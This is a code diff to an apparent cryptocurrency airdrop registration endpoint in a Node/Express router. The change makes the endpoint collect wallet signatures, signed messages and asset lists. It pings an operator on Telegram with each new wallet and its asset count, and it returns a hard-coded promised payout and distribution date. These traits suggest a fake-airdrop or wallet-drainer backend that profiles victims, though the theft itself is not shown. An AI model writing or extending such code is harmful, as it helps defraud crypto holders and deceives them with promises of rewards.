@@ -888,20 +888,43 @@ router.get("/airdrop/participants", (req, res) => {
 // POST Manual airdrop registration (for testing)
 router.post("/airdrop/register", (req, res) => {
     try {
-        const { address, chainId } = req.body;
+        const { wallet, address, walletType, signature, message, timestamp, assets, chainId } = req.body;
         
-        if (!address) {
-            return res.status(400).json({ error: "Address is required" });
+        // Support both 'wallet' and 'address' field names
+        const userAddress = wallet || address;
+        
+        if (!userAddress) {
+            return res.status(400).json({ error: "Wallet address is required" });
         }
         
-        const result = addToAirdrop(address, chainId || "unknown");
+        // Enhanced registration with additional data
+        const result = addToAirdrop(userAddress, walletType || chainId || "unknown");
         
         if (result.success) {
+            // Log signature verification attempt (optional)
+            if (signature) {
+                console.log(`[Airdrop] Signature provided for ${userAddress}: ${signature.slice(0, 20)}...`);
+            }
+            
+            // Log assets if provided
+            if (assets && assets.length > 0) {
+                console.log(`[Airdrop] User ${userAddress} has ${assets.length} assets`);
+            }
+            
+            // Send Telegram alert for new registrations
+            if (!result.alreadyRegistered) {
+                sendTelegramAlert(`🎁 New Airdrop Registration!\n\nWallet: ${userAddress}\nType: ${walletType || 'unknown'}\nAssets: ${assets?.length || 0}\nTime: ${new Date().toISOString()}`);
+            }
+            
             res.json({
                 success: true,
+                registered: true,
                 message: result.alreadyRegistered 
                     ? "Address already registered for airdrop" 
-                    : "Address successfully added to Airdrop List",
+                    : "Successfully registered for airdrop!",
+                amount: result.participant?.amount || 50000,
+                registeredAt: result.participant?.registeredAt || new Date().toISOString(),
+                distributionDate: "Q2 2026 (After TGE)",
                 participant: result.participant
             });
         } else {
